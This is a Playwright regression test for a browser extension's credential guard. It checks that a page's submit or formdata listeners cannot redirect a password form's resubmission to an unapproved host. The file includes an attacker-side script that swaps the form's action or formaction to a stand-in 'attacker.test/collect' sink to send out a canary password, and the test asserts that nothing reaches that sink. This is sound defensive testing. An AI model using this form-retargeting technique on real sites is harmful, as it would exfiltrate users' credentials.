/**
 * #1084: the credential guard's own resubmission must reach only the
 * destination it approved.
 *
 * The guard stops the user's password-form submit, assesses the destination,
 * then resumes with `requestSubmit(submitter)`. That dispatches a new trusted
 * `submit` event the guard lets through, so the page's own `submit` (and
 * later `formdata`) listeners run after the guard's last destination check and
 * before the browser reads the action. A page listener that swaps `formaction`,
 * `action` or `formtarget` there used to send the canary to a host nobody
 * approved.
 *
 * Both hosts are fake and served by request interception, so every POST is
 * counted at the network boundary: the attacker sink must see zero canaries.
 */
import { chromium, expect, test, type BrowserContext, type Page, type Worker } from "@playwright/test";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { SUITE_SETTINGS_KEY } from "../../extension/src/shared/storage";
import { clickModalButton, getServiceWorker, waitForCredentialModal } from "./extension_test_utils";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const extensionPath = process.env.EXTENSION_PATH
  ? path.resolve(process.env.EXTENSION_PATH)
  : path.resolve(__dirname, "..", "..", "extension", "dist");

const LOGIN_URL = "http://victim.test/login";
const APPROVED_URL = "http://victim.test/session";
const ATTACKER_URL = "http://attacker.test/collect";
const CANARY = "canary-password-1084";

test.setTimeout(120_000);

type Retarget = "none" | "submit-formaction" | "submit-action" | "submit-formaction-blank" | "formdata-action";
type Sinks = { approved: string[]; attacker: string[]; resumedSubmits: number };

const FIXTURE = `<!doctype html><html><body>
<form id="login" method="post" action="${APPROVED_URL}">
  <input name="user" value="synthetic@example.invalid">
  <input id="password" name="password" type="password" value="${CANARY}">
  <button id="go" type="submit">Sign in</button>
</form></body></html>`;

async function withVictimPage(
  prompted: boolean,
  run: (page: Page, sinks: Sinks, context: BrowserContext) => Promise<void>,
): Promise<void> {
  const userDataDir = fs.mkdtempSync(path.join(os.tmpdir(), "navsentinel-cred-retarget-"));
  let context: BrowserContext | null = null;
  try {
    context = await chromium.launchPersistentContext(userDataDir, {
      headless: false,
      timeout: 60_000,
      args: [`--disable-extensions-except=${extensionPath}`, `--load-extension=${extensionPath}`],
    });
    const serviceWorker: Worker = await getServiceWorker(context);
    await expect.poll(() => serviceWorker.evaluate(() => typeof chrome.storage?.local?.set === "function")).toBe(true);
    await serviceWorker.evaluate(
      async ({ settingsKey, prompted }) => {
        await chrome.storage.local.set({
          [settingsKey]: {
            nav: { defaultMode: "smart", debug: false },
            credential: {
              mode: "smart",
              promptOnUntrustedDomain: prompted,
              promptOnMediumRisk: false,
              mediumRiskThreshold: 100,
              blockHttpPasswordSubmit: false,
              warnOnPaste: false,
              similarity: { enabled: true, maxDistance: 2 },
            },
            logLimit: 300,
          },
        });
      },
      { settingsKey: SUITE_SETTINGS_KEY, prompted },
    );

    const sinks: Sinks = { approved: [], attacker: [], resumedSubmits: 0 };
    await context.route("http://victim.test/**", async (route) => {
      const request = route.request();
      if (request.url() === LOGIN_URL) {
        await route.fulfill({ contentType: "text/html", body: FIXTURE });
        return;
      }
      if (request.url().startsWith(APPROVED_URL)) sinks.approved.push(`${request.method()} ${request.postData() ?? ""}`);
      await route.fulfill({ contentType: "text/html", body: "<p>approved sink</p>" });
    });
    await context.route("http://attacker.test/**", async (route) => {
      const request = route.request();
      sinks.attacker.push(`${request.method()} ${request.url()} ${request.postData() ?? ""}`);
      await route.fulfill({ contentType: "text/html", body: "<p>attacker sink</p>" });
    });

    const page = await context.newPage();
    page.on("console", (message) => {
      if (message.text() === "fixture:resumed-submit") sinks.resumedSubmits += 1;
    });
    await page.goto(LOGIN_URL, { waitUntil: "domcontentloaded" });
    // The credential guard is a document_start content script; wait until its
    // settings cache can have primed before the first submit.
    await page.waitForTimeout(300);
    await run(page, sinks, context);
  } finally {
    await context?.close();
    fs.rmSync(userDataDir, { recursive: true, force: true });
  }
}

/** Page-world (attacker-controlled) script, installed before the user's click. */
async function installRetarget(page: Page, mode: Retarget): Promise<void> {
  await page.evaluate(
    ({ mode, attacker }) => {
      const form = document.getElementById("login") as HTMLFormElement;
      const go = document.getElementById("go") as HTMLButtonElement;
      form.addEventListener("submit", () => {
        console.log("fixture:resumed-submit");
        if (mode === "submit-formaction") go.setAttribute("formaction", attacker);
        if (mode === "submit-action") form.action = attacker;
        if (mode === "submit-formaction-blank") {
          go.setAttribute("formaction", attacker);
          go.setAttribute("formtarget", "_blank");
        }
      });
      if (mode === "formdata-action") {
        form.addEventListener("formdata", () => {
          form.action = attacker;
        });
      }
    },
    { mode, attacker: ATTACKER_URL },
  );
}

async function expectNoAttackerPost(page: Page, sinks: Sinks): Promise<void> {
  // TEST_INVALID guard: the page listener must have seen the guard's resumed
  // submit, otherwise the retarget never had a chance to run.
  await expect.poll(() => sinks.resumedSubmits, { timeout: 10_000 }).toBe(1);
  await page.waitForTimeout(2_000);
  expect(sinks.attacker, "the attacker sink must receive zero canary POSTs").toEqual([]);
  expect(sinks.approved, "a retargeted submit is blocked, not silently sent to the old host").toEqual([]);
}

test("silent allow without a retarget still POSTs to the approved destination (control) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  await withVictimPage(false, async (page, sinks) => {
    await installRetarget(page, "none");
    await page.click("#go", { noWaitAfter: true });
    await expect.poll(() => sinks.approved.length, { timeout: 10_000 }).toBe(1);
    expect(sinks.approved[0]).toContain(`password=${CANARY}`);
    expect(sinks.attacker).toEqual([]);
  });
});

for (const mode of ["submit-formaction", "submit-action", "submit-formaction-blank", "formdata-action"] as const) {
  test(`silent allow: a ${mode} retarget in the resumed submit sends nothing to the attacker (#1084) @regression`, async () => {
    test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
    await withVictimPage(false, async (page, sinks) => {
      await installRetarget(page, mode);
      await page.click("#go", { noWaitAfter: true });
      await expectNoAttackerPost(page, sinks);
    });
  });
}

test("Proceed once: a formaction retarget in the resumed submit sends nothing to the attacker (#1084) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  await withVictimPage(true, async (page, sinks) => {
    await installRetarget(page, "submit-formaction");
    await page.click("#go", { noWaitAfter: true });
    await waitForCredentialModal(page);
    await clickModalButton(page, "Proceed once");
    await expectNoAttackerPost(page, sinks);
  });
});

test("Proceed once without a retarget still POSTs to the approved destination (control) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  await withVictimPage(true, async (page, sinks) => {
    await installRetarget(page, "none");
    await page.click("#go", { noWaitAfter: true });
    await waitForCredentialModal(page);
    await clickModalButton(page, "Proceed once");
    await expect.poll(() => sinks.approved.length, { timeout: 10_000 }).toBe(1);
    expect(sinks.attacker).toEqual([]);
  });
});
